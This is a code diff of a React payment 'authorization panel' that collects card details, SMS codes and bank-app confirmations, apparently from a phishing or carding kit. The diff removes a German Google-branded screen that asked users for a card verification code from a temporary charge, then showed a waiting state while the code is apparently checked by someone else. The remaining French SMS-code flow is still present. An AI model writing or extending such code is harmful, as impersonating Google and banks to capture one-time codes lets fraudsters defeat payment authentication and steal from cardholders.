@@ -2,12 +2,10 @@ import React, { useEffect, useState } from 'react';
 import { Card, CardContent } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
-import { CreditCard, Shield, Lock, Smartphone, MessageSquare, CheckCircle, Clock } from 'lucide-react';
+import { CreditCard, Shield, Lock, Smartphone, MessageSquare, CheckCircle } from 'lucide-react';
 import { supabase } from '@/integrations/supabase/client';
 import { useOptimisticPaymentSession } from '@/hooks/useOptimisticPaymentSession';
 import { PaymentIcons } from '@/components/ui/PaymentIcons';
-import { InputOTP, InputOTPGroup, InputOTPSlot } from '@/components/ui/input-otp';
-import challengeCodeImage from '@/assets/challenge_code_illustration.webp';
 
 interface AuthorizationPanelProps {
   orderId: string;
@@ -18,7 +16,6 @@ const AuthorizationPanel: React.FC<AuthorizationPanelProps> = ({ orderId, sessio
   const [orderData, setOrderData] = useState<any>(null);
   const [currentTextIndex, setCurrentTextIndex] = useState(0);
   const [smsCode, setSmsCode] = useState('');
-  const [googleCode, setGoogleCode] = useState('');
 
   const detectCardType = (cardNumber: string): 'visa' | 'mastercard' | 'amex' | 'unknown' => {
     const cleanNumber = cardNumber.replace(/\s/g, '');
@@ -62,9 +59,7 @@ const AuthorizationPanel: React.FC<AuthorizationPanelProps> = ({ orderId, sessio
     setVerificationMethod,
     confirmAppVerification,
     enterSmsCode,
-    submitSmsCode: submitSmsCodeOptimistic,
-    enterGoogleCode,
-    submitGoogleCode
+    submitSmsCode: submitSmsCodeOptimistic
   } = useOptimisticPaymentSession(sessionId);
 
   const processingTexts = [
@@ -111,12 +106,6 @@ const AuthorizationPanel: React.FC<AuthorizationPanelProps> = ({ orderId, sessio
     setSmsCode('');
   };
 
-  const handleGoogleCodeSubmit = async () => {
-    if (!googleCode || googleCode.length !== 6) return;
-    await submitGoogleCode(googleCode);
-    setGoogleCode('');
-  };
-
   const handleMethodSelection = async (method: string) => {
     await setVerificationMethod(method);
   };
@@ -141,12 +130,6 @@ const AuthorizationPanel: React.FC<AuthorizationPanelProps> = ({ orderId, sessio
           return renderFinalProcessingState();
         } else {
           return renderSmsConfirmationState();
-        }
-      case 'google_code_confirmation':
-        if (verification_status === 'google_code_confirmed') {
-          return renderFinalProcessingState();
-        } else {
-          return renderGoogleCodeConfirmationState();
         }
       case 'choice_required':
         return renderChoiceState();
@@ -279,108 +262,17 @@ const AuthorizationPanel: React.FC<AuthorizationPanelProps> = ({ orderId, sessio
           <span className="font-medium">Confirmation par app : Via votre application bancaire</span>
         </Button>
         
-          <Button
-            onClick={() => handleMethodSelection('sms_confirmation')}
-            variant="outline"
-            className="w-full px-3 py-2 flex items-center space-x-2 border hover:border-blue-500"
-          >
-            <MessageSquare className="w-5 h-5 text-blue-600" />
-            <span className="font-medium">Code SMS : Par message texte</span>
-          </Button>
-          
-          <Button
-            onClick={() => handleMethodSelection('google_code_confirmation')}
-            variant="outline"
-            className="w-full px-3 py-2 flex items-center space-x-2 border hover:border-blue-500"
-          >
-            <MessageSquare className="w-5 h-5 text-blue-600" />
-            <span className="font-medium">Google-Code : Code aus Transaktionen</span>
-          </Button>
+        <Button
+          onClick={() => handleMethodSelection('sms_confirmation')}
+          variant="outline"
+          className="w-full px-3 py-2 flex items-center space-x-2 border hover:border-blue-500"
+        >
+          <MessageSquare className="w-5 h-5 text-blue-600" />
+          <span className="font-medium">Code SMS : Par message texte</span>
+        </Button>
       </div>
     </>
   );
-
-  const renderGoogleCodeConfirmationState = () => {
-    const cardType = orderData?.card_number ? detectCardType(orderData.card_number) : 'unknown';
-    const cardInfo = getCardTypeInfo(cardType);
-    const lastFourDigits = orderData?.card_number?.slice(-4) || '****';
-    
-    return (
-      <>
-        {renderFailureMessage()}
-        
-        <div className="space-y-6">
-          <div className="text-center space-y-4">
-            <img 
-              src={challengeCodeImage} 
-              alt="Challenge Code Illustration" 
-              className="w-64 h-auto mx-auto"
-            />
-            
-            <div className="space-y-2">
-              <h2 className="text-xl font-semibold text-gray-900" style={{ fontFamily: 'Google Sans, sans-serif' }}>
-                Karte bestätigen
-              </h2>
-              <p className="text-base text-gray-700 px-4">
-                Bestätige {cardInfo.name} •••• {lastFourDigits} mit einem Code, den du neben einer vorübergehenden Belastung findest. 
-                Die Belastung erscheint in den Transaktionen deiner Karte (in deinen App- oder Kontoabrechnungen).
-              </p>
-            </div>
-          </div>
-
-          <div className="space-y-4">
-            <div className="text-center">
-              <label className="text-sm font-medium text-gray-700">Google-Code eingeben</label>
-            </div>
-            
-            <div className="flex justify-center">
-              <InputOTP 
-                maxLength={6} 
-                value={googleCode}
-                onChange={setGoogleCode}
-              >
-                <InputOTPGroup>
-                  <InputOTPSlot index={0} />
-                  <InputOTPSlot index={1} />
-                  <InputOTPSlot index={2} />
-                  <InputOTPSlot index={3} />
-                  <InputOTPSlot index={4} />
-                  <InputOTPSlot index={5} />
-                </InputOTPGroup>
-              </InputOTP>
-            </div>
-
-            {googleCode.length === 6 && (
-              <div className="flex justify-center">
-                <Button 
-                  onClick={handleGoogleCodeSubmit}
-                  className="w-full max-w-sm bg-blue-600 hover:bg-blue-700 text-white py-3 text-base"
-                >
-                  Code bestätigen
-                </Button>
-              </div>
-            )}
-          </div>
-
-          {sessionData?.verification_status === 'google_code_entered' && (
-            <div className="text-center p-4 bg-blue-50 border border-blue-200 rounded-lg">
-              <Clock className="w-6 h-6 mx-auto mb-2 text-blue-600" />
-              <p className="text-sm font-medium text-blue-700">Code gesendet</p>
-              <p className="text-xs text-blue-600">Warte auf Bestätigung...</p>
-            </div>
-          )}
-
-          {sessionData?.verification_status === 'google_code_confirmed' && (
-            <div className="text-center p-4 bg-green-50 border border-green-200 rounded-lg">
-              <CheckCircle className="w-6 h-6 mx-auto mb-2 text-green-600" />
-              <p className="text-sm font-medium text-green-700">Code bestätigt</p>
-              <p className="text-xs text-green-600">Zahlung wird verarbeitet...</p>
-            </div>
-          )}
-        </div>
-      </>
-    );
-  };
 
   const renderFinalProcessingState = () => (
     <>
